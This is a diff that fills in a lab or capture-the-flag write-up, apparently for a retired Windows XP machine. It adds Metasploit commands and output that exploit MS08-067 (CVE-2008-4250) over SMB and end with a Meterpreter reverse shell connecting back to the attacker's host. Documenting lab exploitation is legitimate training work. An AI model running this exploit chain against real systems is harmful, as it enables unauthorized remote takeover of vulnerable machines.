@@ -96,19 +96,46 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 68.34 seconds
 ```
 
-The vuln scan gave me 
+The vuln scan gave me two CVE related SMB RCE . Here is the result in Metasploit
+
+```bash
+msf6 > search CVE-2008-4250
+
+Matching Modules
+================
+
+   #   Name                                                             Disclosure Date  Rank   Check  Description
+   -   ----                                                             ---------------  ----   -----  -----------
+   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+   1     \_ target: Automatic Targeting                                 .                .      .      .
+   2     \_ target: Windows 2000 Universal                              .                .      .      .
+   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .       
+
+```
 ## Exploitation
 
-* **Gaining Initial Access:**
-    * Step-by-step explanation of how you exploited the vulnerability to gain initial access to the machine.
-    * ```
-      [Include any relevant code snippets or commands used]
-      ```
-* **Privilege Escalation (if applicable):**
-    * Describe the privilege escalation technique used.
-    * Provide details of any exploits or misconfigurations leveraged.
-* **Proof of Access:**
-    * ![Screenshot of flags or other evidence]
+* **Gaining Initial Access:** Using the `ms08_067_netapi` module , I was able to get foothold access to the target easily.
+
+```bash
+
+msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.129.227.181
+rhosts => 10.129.227.181
+msf6 exploit(windows/smb/ms08_067_netapi) > set lhost tun0
+lhost => 10.10.14.3
+msf6 exploit(windows/smb/ms08_067_netapi) > check
+[+] 10.129.227.181:445 - The target is vulnerable.
+msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.3:4444 
+[*] 10.129.227.181:445 - Automatically detecting the target...
+[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (176198 bytes) to 10.129.227.181
+[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.227.181:1036) at 2024-10-11 23:34:35 +0900
+
+```
+
 
 ## Post-Exploitation
 
